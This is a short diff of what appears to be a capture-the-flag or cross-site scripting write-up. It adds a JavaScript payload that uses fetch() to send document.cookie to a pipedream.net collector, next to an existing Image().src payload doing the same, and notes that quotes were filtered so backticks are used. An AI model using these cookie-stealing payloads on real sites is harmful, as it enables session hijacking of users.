@@ -11,6 +11,10 @@ Host a sever pipedream and send request
 Note: **' , "** filted so we use \`
 
 ```javascript
+payload = */fetch(`https://enz92o3d70fhjpm.m.pipedream.net?c=`+document.cookie)/*
+```
+
+```javascript
 payload = */ new Image().src=`https://enz92o3d70fhjpm.m.pipedream.net?c=`+document.cookie /*
 ```
 
